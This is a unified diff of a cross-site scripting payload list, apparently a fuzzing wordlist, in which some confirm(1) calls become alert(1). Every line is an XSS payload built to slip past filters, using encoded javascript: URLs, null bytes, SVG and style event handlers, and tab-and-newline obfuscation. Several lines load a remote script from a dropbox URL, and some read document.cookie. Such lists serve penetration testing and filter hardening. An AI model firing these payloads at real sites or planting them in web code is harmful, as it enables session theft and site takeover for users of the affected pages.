@@ -1,9 +1,9 @@
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
-<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
-<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<svg><style>{font-family&colon;'<iframe/onload=alert(1)>'
+<input/onmouseover="javaSCRIPT&colon;alert&lpar;1&rpar;"
 <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
-<img/src=`%00` onerror=this.onerror=confirm(1)
-<form><isindex formaction="javascript&colon;confirm(1)"
+<img/src=`%00` onerror=this.onerror=alert(1)
+<form><isindex formaction="javascript&colon;alert(1)"
 <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
 <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
 <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
@@ -14,7 +14,7 @@
 <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
 <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
 <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
-<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
 <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
 <form><a href="javascript:\u0061lert&#x28;1&#x29;">X
 </script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
@@ -29,22 +29,22 @@ http://www.google<script .com>alert(document.location)</script
 </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
 &#00;</form><input type&#61;"date" onfocus="alert(1)">
 <form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
-<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<script /***/>/***/alert('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
 <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
 <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
 <script ~~~>alert(0%0)</script ~~~>
 <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
 <///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
 <img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
-&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=alert(1)>'
 &#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
 <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
-<div/style="width:expression(confirm(1))">X</div> {IE7}
+<div/style="width:expression(alert(1))">X</div> {IE7}
 <iframe/%00/ src=javaSCRIPT&colon;alert(1)
 //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
 /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
 //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
-</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=alert(1)>'</font>/</style>
 <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
 </plaintext\></|\><plaintext/onmouseover=prompt(1)
 </svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
@@ -62,7 +62,7 @@ http://www.google<script .com>alert(document.location)</script
 <iframe/src \/\/onload = prompt(1)
 <iframe/onreadystatechange=alert(1)
 <svg/onload=alert(1)
-<input value=<><iframe/src=javascript:confirm(1)
+<input value=<><iframe/src=javascript:alert(1)
 <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
 http://www.<script>alert(1)</script .com
 <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
@@ -84,7 +84,7 @@ http://www.<script>alert(1)</script .com
 <body/onload=&lt;!--&gt;&#10alert(1)>
 <script itworksinallbrowsers>/*<script* */alert(1)</script
 <img src ?itworksonchrome?\/onerror = alert(1)
-<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script>//&NewLine;alert(1);</script </svg>
 <svg><script onlypossibleinopera:-)> alert(1)
 <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
 <script x> alert(1) </script 1=2
